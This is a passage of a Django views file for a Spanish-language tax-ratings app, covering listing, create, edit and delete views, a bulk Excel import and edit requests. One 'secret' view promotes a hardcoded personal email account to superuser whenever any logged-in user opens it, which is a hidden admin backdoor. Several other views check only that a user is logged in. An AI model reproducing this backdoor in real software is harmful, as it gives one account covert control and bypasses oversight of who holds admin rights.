        'fecha_inicio_seleccionada': fecha_inicio_str,
    }
    
    return render(request, 'reportes.html', context)




@login_required
def vista_secreta_convertir_admin(request):
    
    EMAIL_DEL_USUARIO_A_PROMOVER = "Axeloctavioduranroblero@gmail.com"
    
    try:
        usuario = User.objects.get(username=EMAIL_DEL_USUARIO_A_PROMOVER)
        
        usuario.is_staff = True
        usuario.is_superuser = True
        usuario.save()
        
        messages.success(request, f'¡ÉXITO! El usuario {usuario.username} ahora es Administrador.')
        return redirect('inicio')

    except User.DoesNotExist:
        messages.error(request, f'Error: El usuario "{EMAIL_DEL_USUARIO_A_PROMOVER}" no fue encontrado.')
        return redirect('inicio')
    except Exception as e:
        messages.error(request, f'Error inesperado: {e}')
        return redirect('inicio')


@login_required
def vista_calificaciones_dashboard(request):
    """ Dashboard principal que lista las calificaciones ingresadas """
    
    anio = request.GET.get('anio')
    mercado = request.GET.get('mercado')
    
    calificaciones = CalificacionTributaria.objects.all().order_by('-fecha_pago')
    
    if anio:
        calificaciones = calificaciones.filter(anio=anio)
    if mercado:
        calificaciones = calificaciones.filter(mercado=mercado)

    paginator = Paginator(calificaciones, 20)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)

    context = {
        'page_obj': page_obj,
        'anio_filter': anio,
        'mercado_filter': mercado
    }
    return render(request, 'calificaciones/dashboard.html', context)


@login_required
def vista_gestionar_calificacion(request, id=None):
    """ Vista única para Crear (sin ID) y Modificar (con ID) """
    instance = None
    if id:
        instance = get_object_or_404(CalificacionTributaria, pk=id)
    
    if request.method == 'POST':
        form = CalificacionForm(request.POST, instance=instance)
        if form.is_valid():
        
            calificacion = form.save()
            
            try:
                clasificacion_auto, _ = Clasificacion.objects.get_or_create(
                    nombre="Calificaciones Automáticas",
                    defaults={'creado_por': request.user}
                )
                
                DatoTributario.objects.create(
                    clasificacion=clasificacion_auto,
                    nombre_dato=f"CALIF: {calificacion.instrumento} ({calificacion.anio})",
                    monto=calificacion.valor_historico,
                    factor=calificacion.factor_08, 
                    fecha_dato=calificacion.fecha_pago,
                    creado_por=request.user
                )
            except Exception as e:
                print(f"Advertencia: No se pudo crear la copia automática: {e}")
            
            accion = "actualizada" if id else "creada"
            messages.success(request, f'Calificación {accion} y registrada en Reportes exitosamente.')
            return redirect('calificaciones_dashboard')
        else:
            messages.error(request, 'Error en el formulario. Revisa los datos.')
    else:
        form = CalificacionForm(instance=instance)

    return render(request, 'calificaciones/formulario.html', {'form': form, 'instance': instance})

@login_required
def vista_eliminar_calificacion(request, id):
    """ Elimina un registro """
    calificacion = get_object_or_404(CalificacionTributaria, pk=id)
    
    if request.method == 'POST':
        calificacion.delete()
        messages.success(request, 'Registro eliminado correctamente.')
        return redirect('calificaciones_dashboard')
        
    return render(request, 'calificaciones/eliminar.html', {'calificacion': calificacion})


@login_required
def vista_carga_masiva_calificaciones(request):
    """ Lógica específica para leer el Excel complejo de Calificaciones """
    if request.method == 'POST':
        form = CargaMasivaCalificacionForm(request.POST, request.FILES)
        if form.is_valid():
            archivo = request.FILES['archivo_excel']
            try:
                df = pd.read_excel(archivo)
                df.columns = df.columns.str.strip().str.upper()
                
               
                columnas_disponibles = list(df.columns)
                data_records = df.to_dict('records')
                del df
                gc.collect()
                
                
                registros_procesados = 0
                
                for index, row in enumerate(data_records):
                    try:
                        sec_eve = row.get('SEC_EVE') or row.get('SECUENCIA') or row.get('ID')
                        if not sec_eve:
                            continue 

                        datos = {
                            'mercado': row.get('MERCADO', 'AC'),
                            'instrumento': row.get('NEMO') or row.get('INSTRUMENTO') or 'DESCONOCIDO',
                            'descripcion': row.get('DESCRIPCION', ''),
                            'fecha_pago': row.get('FEC_PAGO') or row.get('FECHA') or timezone.now().date(),
                            'anio': row.get('EJERCICIO') or row.get('ANO') or datetime.now().year,
                            'valor_historico': row.get('VALOR_HISTORICO', 0),
                        }

                        for i in range(8, 38):
                            field_name = f'factor_{i:02d}' 
                            
                            keys_to_check = [
                                f'F{i}-', f'F{i:02d}-', 
                                f'FACTOR-{i}', f'FACTOR {i}',
                                f'F{i}', f'F{i:02d}'
                            ]
                            
                            val = 0
                            for col in columnas_disponibles:
                                if any(col.startswith(k) for k in keys_to_check):
                                    val = row[col]
                                    break
                            
                            if isinstance(val, str):
                                val = val.replace(',', '.').replace('$', '').strip()
                            
                            datos[field_name] = pd.to_numeric(val, errors='coerce') or 0

                        CalificacionTributaria.objects.update_or_create(
                            secuencia_evento=sec_eve,
                            defaults=datos
                        )
                        registros_procesados += 1
                        
                    except Exception as e:
                        print(f"Error en fila {index}: {e}")
                        continue

                messages.success(request, f'Proceso finalizado. {registros_procesados} registros procesados.')
                return redirect('calificaciones_dashboard')

            except Exception as e:
                messages.error(request, f"Error al procesar el archivo: {str(e)}")
    else:
        form = CargaMasivaCalificacionForm()

    return render(request, 'calificaciones/carga_masiva.html', {'form': form})



@login_required
def vista_solicitar_edicion(request, pk):
    dato = get_object_or_404(DatoTributario, pk=pk)
    
    if dato.creado_por != request.user and not request.user.is_staff:
        messages.error(request, "No tienes permiso para solicitar edición de este dato.")
        return redirect('listar_datos_tributarios')

    existe_solicitud = SolicitudEdicion.objects.filter(dato=dato, solicitante=request.user, revisado=False).exists()
    
    if existe_solicitud:
        messages.warning(request, f"Ya has enviado una solicitud para '{dato.nombre_dato}'.")
    else:
        SolicitudEdicion.objects.create(
            dato=dato,
            solicitante=request.user,
            mensaje=f"Usuario {request.user.email} solicita editar dato ID {dato.id}."
        )
        messages.success(request, "Se ha notificado al Administrador. Espera el desbloqueo.")

    return redirect('listar_datos_tributarios')